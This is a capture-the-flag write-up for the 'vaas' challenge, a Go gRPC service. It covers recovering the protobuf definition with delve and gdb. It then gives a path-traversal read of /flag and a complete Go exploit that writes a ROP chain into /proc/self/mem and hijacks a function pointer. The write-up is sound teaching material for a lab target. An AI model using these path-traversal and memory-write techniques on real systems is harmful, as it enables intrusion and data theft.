versions as a service! 2019 has called and it's finally time to ditch github, gitlab & co!

we are proud to introduce you to versions-as-a-service, our enterprise version control service. finally get rid of any decentralized stuff and put it to the only place it belongs to, the cloud.

try yourself! as we are enterprise we can not provide you with a free version, however, as we believe in free software, we allow you to check out the demo version! it's free! find us at hitme.tasteless.eu:10201

deploy the demo! as we are cloud-native, we do functions as a service. like real. one request = one container. no shared resources. this is beyond-scaling! build your server with docker build -t vaas . and run with socat -v tcp-listen:1125,reuseaddr,fork exec:"docker run --rm -i --read-only --tmpfs /revs\:rw\,noexec\,nosuid\,size=11m --user 9000\:9000 vaas". flag is in /flag.

Author: ccm

sha1 7eaf07f1e3b1c4c1ff99b45db546606d vaas

# Run it

```
docker build -t vaas .
socat -v tcp-listen:1125,reuseaddr,fork exec:"docker run --rm -i --read-only --tmpfs /revs\\:rw\\,noexec\\,nosuid\\,size=11m --user 9000\\:9000 vaas"
```

# Overview

vaas is a static compiled go binary, and basically impossible to reverse with IDA/Ghidra unless you love frustration ;)

However, it's quite easy doing so with delve: github.com/go-delve/delve.

The binary itself talks (unsecured) gRPC over HTTP/2, and uses a `net.Listener` implementation for stdio. This allows easier deployment via docker containers.

# Connecting

First of all to speak gRPC we need a descriptor/protobuf definition. vaas does not have reflection enabled, therefore we need to extract it from the binary. Eventually this turns out to be quite easy with delve and gdb:

```
root@4fcd6c0ee805:/app/server# dlv exec ./vaas
Type 'help' for list of commands.
(dlv) vars vaas
...
tasteless.eu/ctf/a2019/vaas.fileDescriptor_0a6d0850c8612ba4 = []uint8 len: 421, cap: 421, [...]
...
```

```
root@4fcd6c0ee805:/app/server# gdb ./vaas
(gdb) p 'tasteless.eu/ctf/a2019/vaas.fileDescriptor_0a6d0850c8612ba4'
$1 = {array = 0xc861e0 "\037\213\b", len = 421, cap = 421}
(gdb) x/421bx 0xc861e0
0xc861e0:	0x1f	0x8b	0x08	0x00	0x00	0x00	0x00	0x00
0xc861e8:	0x02	0xff	0x8c	0x53	0xc1	0x8e	0xd3	0x30
0xc861f0:	0x10	0x55	0x93	0x34	0x5b	0xa6	0xd9	0xdd
0xc861f8:	0xe2	0x2d	0x55	0x94	0x53	0x65	0x09	0x51
0xc86200:	0x55	0xb4	0x82	0x56	0x3d	0xf4	0x88	0x8a
0xc86208:	0x84	0xb8	0x81	0x91	0xb8	0x87	0xc4	0x69
0xc86210:	0x2d	0x48	0x1c	0x62	0x27	0x12	0x7f	0xc2
0xc86218:	0xe7	0x22	0x3b	0x76	0x9b	0x46	0xa2	0xda
0xc86220:	0xdb	0xcc	0x9b	0x97	0xf7	0x66	0xc6	0x13
0xc86228:	0x80	0x26	0x8e	0xc5	0xba	0xac	0xb8	0xe4
0xc86230:	0xc8	0x53	0x31	0x5e	0xc1	0xe3	0xe1	0x44
0xc86238:	0x93	0x9f	0xbc	0x96	0x84	0xfe	0xae	0xa9
0xc86240:	0x90	0x28	0x82	0x51	0x45	0x1b	0x26	0x18
0xc86248:	0x2f	0xc2	0xc1	0x7c	0xb0	0x78	0x41	0xce
0xc86250:	0x39	0x7e	0x0b	0x93	0x0b	0x5d	0x94	0xbc
0xc86258:	0x10	0x14	0x85	0x70	0x97	0xf0	0x42	0xd2
0xc86260:	0x42	0x6a	0x7a	0x40	0x6c	0x8a	0x0f	0x70
0xc86268:	0x7f	0xe0	0x79	0xce	0xce	0xd2	0xff	0xa5
0xc86270:	0xaa	0x4a	0x4e	0x85	0x88	0x8f	0x34	0x74
0xc86278:	0xb4	0xa7	0x4d	0xf1	0x12	0x1e	0xac	0xc8
0xc86280:	0xc5	0xb0	0xa1	0x55	0xa7	0x3f	0x9b	0xe2
0xc86288:	0x1d	0x0c	0xbf	0xc4	0x32	0x39	0xa1	0x19
0xc86290:	0xf8	0x3c	0xcb	0x04	0x6d	0x7d	0x5c	0x62
0xc86298:	0x32	0x34	0x85	0x61	0xa9	0x08	0xda	0x24
0xc862a0:	0x20	0x6d	0x82	0xdf	0xc3	0xf8	0x23	0xcb
0xc862a8:	0x32	0xdb	0x25	0x02	0x2f	0xab	0x78	0x6e
0xc862b0:	0xc4	0x75	0x8c	0x1e	0xc0	0x91	0xdc	0xb4
0xc862b8:	0xe6	0x48	0x8e	0x77	0x10	0xb4	0x9f	0x98
0xc862c0:	0x9e	0x5e	0xc3	0x9d	0xd6	0xa2	0x22	0x1c
0xc862c8:	0xcc	0xdd	0xc5	0x78	0x33	0x5e	0xeb	0x5d
0xc862d0:	0xeb	0x76	0x88	0xad	0xe1	0xaf	0x10	0x7c
0xc862d8:	0x28	0xcb	0x5f	0x7f	0x9e	0xb1	0xeb	0xae
0xc862e0:	0xa4	0x73	0x43	0xf2	0x0d	0xdc	0x1b	0x49
0xc862e8:	0xd3	0xca	0x0c	0x7c	0x21	0x63	0x59	0x0b
0xc862f0:	0xa3	0x68	0x32	0xfc	0x09	0x1e	0x3f	0xa7
0xc862f8:	0xb4	0x90	0x2c	0x3b	0xdb	0x4f	0xc0	0xad
0xc86300:	0x59	0xaa	0x79	0x1e	0x51	0xa1	0x42	0x8e
0xc86308:	0x2c	0xd5	0x83	0x7a	0x44	0x85	0x0a	0x49
0xc86310:	0x58	0x1a	0xba	0x2d	0x92	0xb0	0x14	0x2f
0xc86318:	0x61	0x72	0x11	0xba	0x6d	0xba	0xf9	0xeb
0xc86320:	0x00	0x7c	0x8f	0xe3	0x6f	0xb4	0x6a	0x58
0xc86328:	0x42	0xd1	0x1e	0x46	0xf6	0x7e	0xd0	0xab
0xc86330:	0x76	0x9c	0xde	0xf9	0x45	0xb3	0x3e	0x6c
0xc86338:	0x1c	0xb6	0xe0	0xb7	0x77	0x80	0x9e	0x0c
0xc86340:	0xa3	0x7b	0x5a	0xd1	0xf4	0x1a	0x34	0x1f
0xc86348:	0xad	0xc0	0x53	0xcf	0x84	0x5e	0xb6	0xd5
0xc86350:	0xce	0x2b	0x47	0xa8	0x0b	0x19	0xfa	0x3b
0xc86358:	0x18	0xea	0x5d	0x22	0x53	0xec	0xbe	0x55
0xc86360:	0xf4	0x74	0x85	0x99	0x2f	0xf6	0x30	0xb2
0xc86368:	0xbb	0xb0	0x03	0xf5	0x96	0x6c	0x07	0xea
0xc86370:	0xaf	0xec	0x87	0xaf	0xff	0xc3	0xed	0xbf
0xc86378:	0x00	0x00	0x00	0xff	0xff	0xd2	0xed	0xb1
0xc86380:	0x96	0x95	0x03	0x00	0x00
```

With the descriptor we can use a small go script and checkout the resulting service description.
This is equivalent to what protoc with the go extension does, and thus we can reuse existing tooling. See `exploit/filedescriptor`.

Eventually this boils down to:

```protobuf
syntax = "proto3";

package vaas;

service VaaService {
    rpc Checkout (CheckoutRequest) returns (CheckoutResponse);
    rpc Commit (CommitRequest) returns (CommitResponse);
    rpc Diff (DiffRequest) returns (DiffResponse);
    rpc Apply (ApplyRequest) returns (ApplyResponse);
    rpc Identify (IdentifyRequest) returns (IdentifyResponse);
}

message CheckoutRequest {
    string revision = 1;
}

message CheckoutResponse {
    bytes content = 1;
}

message CommitRequest {
    bytes content = 1;
    string message = 2;
}

message CommitResponse {
    string version = 1;
}

message Patch {
    int64 offset = 1;
    bytes patch = 2;
}

message DiffRequest {
    string from = 1;
    string to = 2;
}

message DiffResponse {
    repeated Patch patches = 1;
}

message ApplyRequest {
    string revision = 1;
    repeated Patch patches = 2;
}

message ApplyResponse {
    string status = 1;
}

message IdentifyRequest {
    uint64 uid = 1;
    uint64 gid = 2;
    uint64 cid = 3;
}

message IdentifyResponse {
    string status = 1;
}
```

# Exploit 1

Unfortunately I messed up and messed up a check for path traversal in the Checkout method, so the first exploit was straight forward: use vaas.Checkout to obtain the flag:

```
c, err := grpc.Dial("localhost:1125", grpc.WithInsecure(), grpc.WithMaxMsgSize(12574282+1000), grpc.WithDialer(loggedDialer))
check(err)

v := vaas.NewVaaServiceClient(c)

cr, err := v.Checkout(context.Background(), &vaas.CheckoutRequest{Revision: "../../../flag"})
log.Println(cr)
```

# Exploit 2

Now to the actual exploit ;)

vaas has one method called `Apply`, which allows us to apply a list of patches to a revision (filename):

```protobuf
service VaaService {
    rpc Apply (ApplyRequest) returns (ApplyResponse);
}

message ApplyRequest {
    string revision = 1;
    repeated Patch patches = 2;
}

message ApplyResponse {
    string status = 1;
}

message Patch {
    int64 offset = 1;
    bytes patch = 2;
}
```

This essentially boils down to:
```
open("revs/" + rev)
for patch in patches:
  writeat(file, patch.offset, patch.content)
```
(writeat allows to write to anywhere, that's is the reason why everything else was broken and readonly, otherwise a DOS would be trivial :-/)

Now our exploit strategy starts to become obvious: open `/proc/self/mem`, use `writeat` to write shellcode, ???, profit.

We do not have an mem-leak, but thanks go(d), we don't have ASLR, because nobody needs ASLR in 2019 ;) (this is standard go, nothing special about this challenge).

There is one challenge left: as go is, in general, memory safe, and most data structures have information about length, etc. prepended, it is super hard to get a usable stack-layout for ROP.

To circumvent this I added the `loggedError` callback (which messed some errors up, sorry for the confusion! we were really short on time), which takes 3 integers as it's first argument, allowing us to use a `pop ???, pop rsp, ret` gadget to set up rsp and pivot. We can use pretty much the whole heap at `00cca000-00ced000`.

Once again we use delve to get the pointer to `loggedError`:

```
(dlv) vars main
main.loggedError = main.glob..func1
(dlv) p &main.loggedError
(*func(uint64, uint64, uint64, string, error) error)(0xcbb078)
```

Then we can patch that to pivot RSP, ret to another heap region, and ROP `open(/flag); sendfile()`

The only register we can not directly set is `r10` which is used for the `sendfile` length and is set to 6 bytes, not enough for the flag.
However there is a gadget which makes `r10` big enough:
```
0x000000000057c01e: cmovb r10, r14; cmovb r11, r15; cmovb r12, rdi; cmovb r13, rsi; ret;
```

```go
package main

import (
	"bufio"
	"bytes"
	"context"
	"log"
	"net"
	"os"
	"time"

	"google.golang.org/grpc"
	"tasteless.eu/ctf/a2019/vaas"
)

func check(err error) {
	if err != nil {
		log.Println(err)
	}
}

type tee struct {
	net.Conn
}

func (t *tee) Read(b []byte) (n int, err error) {
	n, err = t.Conn.Read(b)
	log.Printf("READ: %s", string(b))
	return
}

func loggedDialer(addr string, timeout time.Duration) (net.Conn, error) {
	c, err := net.Dial("tcp", addr)
	if err != nil {
		return nil, err
	}

	return &tee{c}, err
}

func main() {
	// c, err := grpc.Dial("hitme.tasteless.eu:10201", grpc.WithInsecure(), grpc.WithMaxMsgSize(12574282+1000), grpc.WithDialer(loggedDialer))
	c, err := grpc.Dial("localhost:1125", grpc.WithInsecure(), grpc.WithMaxMsgSize(12574282+1000), grpc.WithDialer(loggedDialer))
	check(err)

	input := bufio.NewScanner(os.Stdin)
	input.Scan()

	v := vaas.NewVaaServiceClient(c)

	// exploit 1
	cr, err := v.Checkout(context.Background(), &vaas.CheckoutRequest{Revision: "../../../flag"})
	check(err)
	log.Println(cr)

	// exploit 2
	d := func(a uint64) []byte {
		return []byte{
			byte(a),
			byte(a >> 8),
			byte(a >> 16),
			byte(a >> 24),
			byte(a >> 32),
			byte(a >> 40),
			byte(a >> 48),
			byte(a >> 56),
		}
	}

	loggedError := int64(0xcbb078)

	popRaxRet := uint64(0x0000000000403e69)
	popRspRet := uint64(0x000000000041966c)
	ret := uint64(0x000000000045471b)

	// stack pivot
	newStack := uint64(0xccee00)
	v.Identify(context.Background(), &vaas.IdentifyRequest{Uid: popRspRet, Gid: newStack, Cid: ret})

	popRsiRet := d(0x000000000047bade)
	popRdiRet := d(0x00000000006827d5)
	popRdxRet := d(0x0000000000627402)
	// popR10Ret :=
	blaR10Ret := d(0x000000000057c7ad) // 0x000000000057c01e: cmovb r10, r14; cmovb r11, r15; cmovb r12, rdi; cmovb r13, rsi; ret;
	syscallRet := d(0x000000000045b4a9)

	req := &vaas.ApplyRequest{
		Revision: "../../../proc/self/mem",
		Patches: append([]*vaas.Patch{},
			&vaas.Patch{
				Offset: 0xcced00,
				Patch:  []byte("/flag\x00"),
			},
			&vaas.Patch{
				// rop chain
				Offset: 0xccee00,
				Patch: bytes.Join([][]byte{
					// open
					d(popRaxRet),
					d(2),
					popRdiRet,
					d(0xcced00),
					popRsiRet,
					d(0),
					popRdxRet,
					d(0),
					syscallRet,

					// sendfile
					blaR10Ret, // mangle r10 first

					popRdiRet,
					d(1), // out

					// here is our opened file (i hope)
					popRsiRet,
					d(0x5), // in

					d(popRaxRet),
					d(40),
					popRdxRet,
					d(0),
					syscallRet,

					// bailout
					d(0),
				}, nil),
			},
			&vaas.Patch{
				Offset: 0xccef00,
				Patch:  d(popRaxRet), // pivot stack via uid, gid, cid
			},
			&vaas.Patch{
				Offset: loggedError, // overwrite loggedError
				Patch:  d(0xccef00),
			},
			&vaas.Patch{
				Offset: 0,
				Patch:  d(0), // trigger
			},
		),
	}

	ar, err := v.Apply(context.Background(), req)
	check(err)
	log.Println(ar)
}
```
